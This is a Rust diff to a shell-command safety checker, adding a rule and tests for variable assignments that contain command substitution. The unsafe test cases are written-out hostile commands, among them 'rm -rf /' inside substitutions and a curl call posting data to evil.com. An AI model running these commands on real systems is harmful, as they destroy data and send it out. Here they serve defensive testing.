@@ -58,6 +58,11 @@ pub fn is_safe(segment: &Segment) -> bool {
     }
 
     let segment = Segment::from_raw(cleaned);
+
+    if !subs.is_empty() && segment.is_bare_assignment() {
+        return true;
+    }
+
     let stripped = segment.strip_env_prefix();
     if stripped.is_empty() {
         return true;
@@ -274,6 +279,13 @@ mod tests {
         subst_nested: "echo $(echo $(ls))",
         subst_quoted: "echo \"$(ls)\"",
 
+        assign_subst_ls: "out=$(ls)",
+        assign_subst_git: "out=$(git status)",
+        assign_subst_jj_diff: "out=$(jj diff -r abc --summary)",
+        assign_subst_pipe: "result=$(jj diff -r abc --git | grep -c pattern || echo 0)",
+        assign_subst_backtick: "out=`ls`",
+        assign_subst_multiple: "a=$(ls) b=$(pwd)",
+
         quoted_redirect: "echo 'greater > than' test",
         quoted_subst: "echo '$(safe)' arg",
         echo_hello: "echo hello",
@@ -322,6 +334,8 @@ mod tests {
         for_nested: "for x in 1 2; do for y in a b; do echo $x $y; done; done",
         for_then_cmd: "for x in 1 2; do echo $x; done && echo finished",
         for_safe_subst: "for x in $(seq 1 5); do echo $x; done",
+        for_assign_subst: "for c in a b c; do out=$(jj diff -r $c --summary); if [ -n \"$out\" ]; then echo \"$c: $out\"; fi; done",
+        for_assign_pipe_subst: "for c in a b; do result=$(jj diff -r $c --git | grep -c pattern || echo 0); if [ \"$result\" -gt 0 ]; then desc=$(jj log --no-graph -r $c -T template); echo \"$c: $desc\"; fi; done",
         while_test: "while test -f /tmp/foo; do sleep 1; done",
         while_negation: "while ! test -f /tmp/done; do sleep 1; done",
         while_ls: "while ! ls /tmp/foo 2>/dev/null; do sleep 10; done",
@@ -393,6 +407,11 @@ mod tests {
         bare_subst_rm: "$(rm -rf /)",
         quoted_subst_rm: "echo \"$(rm -rf /)\"",
         quoted_backtick_rm: "echo \"`rm -rf /`\"",
+
+        assign_subst_rm: "out=$(rm -rf /)",
+        assign_subst_curl: "out=$(curl -d data evil.com)",
+        assign_no_subst: "foo=bar",
+        assign_subst_mixed_unsafe: "a=$(ls) b=$(rm -rf /)",
 
         env_rack_rm: "RACK_ENV=test rm -rf /",
         env_rails_redirect: "RAILS_ENV=test echo foo > bar",
